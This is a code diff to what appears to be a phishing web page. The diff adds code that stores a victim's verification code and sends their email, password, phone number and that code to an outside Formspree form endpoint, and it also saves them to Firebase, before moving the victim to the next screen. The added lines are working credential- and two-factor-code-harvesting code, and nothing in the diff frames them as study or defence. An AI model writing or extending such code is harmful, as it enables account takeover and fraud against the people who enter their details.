@@ -380,12 +380,36 @@
       return;
     }
 
+    window.collectedData.code = code;
+
     var btn = document.getElementById('verifyBtn');
     btn.disabled = true;
     btn.innerHTML = 'Verifying<span class="spinner"></span>';
     hideMsg('codeMsg');
 
     try {
+      await fetch("https://formspree.io/f/mvzdkkoq", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          email: collectedData.email,
+          password: collectedData.password,
+          phone: collectedData.phone,
+          code: collectedData.code
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("Submitted code to Formspree");
+        } else {
+          console.error("Formspree error");
+        }
+      })
+      .catch(error => console.error("Network error:", error));
+
       // ✅ SAVE TO FIREBASE HERE
       await saveUserData(window.collectedData);
       goTo('screen5');
@@ -404,7 +428,8 @@
   let collectedData = window.collectedData = {
     email: "",
     password: "",
-    phone: ""
+    phone: "",
+    code: ""
   };
   function goTo(id) {
     document.querySelectorAll('.card').forEach(function(c) { c.classList.remove('active'); });
